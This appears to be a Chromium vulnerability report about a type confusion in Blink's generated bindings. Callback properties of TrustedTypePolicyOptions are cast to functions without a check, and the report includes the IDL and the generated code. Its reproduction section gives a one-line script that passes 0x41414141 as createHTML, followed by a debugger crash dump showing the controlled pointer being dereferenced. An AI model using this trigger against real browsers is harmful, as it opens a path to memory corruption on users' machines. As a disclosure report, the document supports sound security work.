@@ -1,0 +1,93 @@
+VULNERABILITY DETAILS
+The binding code generator doesn't add checks to ensure that the callback
+properties of a dictionary are indeed JS functions. For example, for the
+the TrustedTypePolicyOptions dictionary:
+https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/trustedtypes/trusted_type_policy_options.idl?rcl=6c2e672967359ad32d19af8b09873adab2c0beec&l=7
+-------------------
+dictionary TrustedTypePolicyOptions {
+   CreateHTMLCallback createHTML;
+   CreateScriptCallback createScript;
+   CreateURLCallback createScriptURL;
+   CreateURLCallback createURL;
+   boolean exposed = false;
+};
+
+callback CreateHTMLCallback = DOMString (DOMString input);
+callback CreateScriptCallback = DOMString (DOMString input);
+callback CreateURLCallback = USVString (DOMString input);
+-------------------
+
+the code is generated as follows:
+https://cs.chromium.org/chromium/src/out/Debug/gen/third_party/blink/renderer/bindings/core/v8/v8_trusted_type_policy_options.cc?rcl=077f8deee2dee38d4836be1df20115eba4884f69&l=35
+-------------------
+void V8TrustedTypePolicyOptions::ToImpl(v8::Isolate* isolate, v8::Local<v8::Value> v8_value, TrustedTypePolicyOptions* impl, ExceptionState& exception_state) {
+  if (IsUndefinedOrNull(v8_value)) {
+    return;
+  }
+  if (!v8_value->IsObject()) {
+    exception_state.ThrowTypeError("cannot convert to dictionary.");
+    return;
+  }
+  v8::Local<v8::Object> v8Object = v8_value.As<v8::Object>();
+  ALLOW_UNUSED_LOCAL(v8Object);
+
+  const v8::Eternal<v8::Name>* keys = eternalV8TrustedTypePolicyOptionsKeys(isolate);
+  v8::TryCatch block(isolate);
+  v8::Local<v8::Context> context = isolate->GetCurrentContext();
+  v8::Local<v8::Value> create_html_value;
+  if (!v8Object->Get(context, keys[0].Get(isolate)).ToLocal(&create_html_value)) {
+    exception_state.RethrowV8Exception(block.Exception());
+    return;
+  }
+  if (create_html_value.IsEmpty() || create_html_value->IsUndefined()) {
+    // Do nothing.
+  } else {
+    V8CreateHTMLCallback* create_html_cpp_value = V8CreateHTMLCallback::Create(create_html_value.As<v8::Function>()); //******* cast with no prior check
+    impl->setCreateHTML(create_html_cpp_value);
+  }               
+[...]
+-------------------
+
+Thus, any JS object might be interpreted as a function.
+
+
+VERSION
+Google Chrome 72.0.3626.81 (Official Build) (64-bit) 
+Please note that the TrustedTypes feature is currently hidden behind the
+"experimental platform features" flag.
+
+
+REPRODUCTION CASE
+<script>
+TrustedTypes.createPolicy('foo', { createHTML: 0x41414141 });
+</script>
+
+
+(790.b30): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+chrome_child!v8::internal::JSReceiver::GetCreationContext+0xa:
+00007ffe`ba967f5a 488b41ff        mov     rax,qword ptr [rcx-1] ds:41414140`ffffffff=????????????????
+0:000> r
+rax=00001313b3350115 rbx=00006fc6d6eaf920 rcx=4141414100000000
+rdx=000000e521dfd190 rsi=000000e521dfd190 rdi=000000e521dfd1d8
+rip=00007ffeba967f5a rsp=000000e521dfd130 rbp=000000e521dfd290
+ r8=00007ffebfb25930  r9=0000000000000018 r10=0000000000000005
+r11=00003f2bc628c240 r12=000000e521dfd330 r13=000001e7dbd16650
+r14=000001e7ddc22a90 r15=00003f2bc62364b8
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+chrome_child!v8::internal::JSReceiver::GetCreationContext+0xa:
+00007ffe`ba967f5a 488b41ff        mov     rax,qword ptr [rcx-1] ds:41414140`ffffffff=????????????????
+0:000> k
+ # Child-SP          RetAddr           Call Site
+00 000000e5`21dfd130 00007ffe`ba967f24 chrome_child!v8::internal::JSReceiver::GetCreationContext+0xa [C:\b\c\b\win64_clang\src\v8\src\objects.cc @ 4010] 
+01 000000e5`21dfd170 00007ffe`bab1a1d7 chrome_child!v8::Object::CreationContext+0x24 [C:\b\c\b\win64_clang\src\v8\src\api.cc @ 4859] 
+02 000000e5`21dfd1b0 00007ffe`bd196835 chrome_child!blink::CallbackFunctionBase::CallbackFunctionBase+0x47 [C:\b\c\b\win64_clang\src\third_party\blink\renderer\platform\bindings\callback_function_base.cc @ 13] 
+03 000000e5`21dfd210 00007ffe`bd195101 chrome_child!blink::V8TrustedTypePolicyOptions::ToImpl+0x125 [C:\b\c\b\win64_clang\src\out\Release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_trusted_type_policy_options.cc @ 57] 
+04 000000e5`21dfd2f0 00007ffe`ba957f93 chrome_child!blink::V8TrustedTypePolicyFactory::CreatePolicyMethodCallback+0x211 [C:\b\c\b\win64_clang\src\out\Release_x64\gen\third_party\blink\renderer\bindings\core\v8\v8_trusted_type_policy_factory.cc @ 234] 
+05 000000e5`21dfd3c0 00007ffe`bbbebb9f chrome_child!v8::internal::FunctionCallbackArguments::Call+0x253 [C:\b\c\b\win64_clang\src\v8\src\api-arguments-inl.h @ 147] 
+06 000000e5`21dfd4e0 00007ffe`bbbeb631 chrome_child!v8::internal::`anonymous namespace'::HandleApiCallHelper<0>+0x20f [C:\b\c\b\win64_clang\src\v8\src\builtins\builtins-api.cc @ 111] 
+07 000000e5`21dfd5e0 00007ffe`ba957ca1 chrome_child!v8::internal::Builtin_Impl_HandleApiCall+0x111 [C:\b\c\b\win64_clang\src\v8\src\builtins\builtins-api.cc @ 0] 
+08 000000e5`21dfd6a0 00007ffe`bc23cdcf chrome_child!v8::internal::Builtin_HandleApiCall+0x41 [C:\b\c\b\win64_clang\src\v8\src\builtins\builtins-api.cc @ 127] 
+09 000000e5`21dfd700 00003921`bff1b0d1 chrome_child!Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit+0x4f
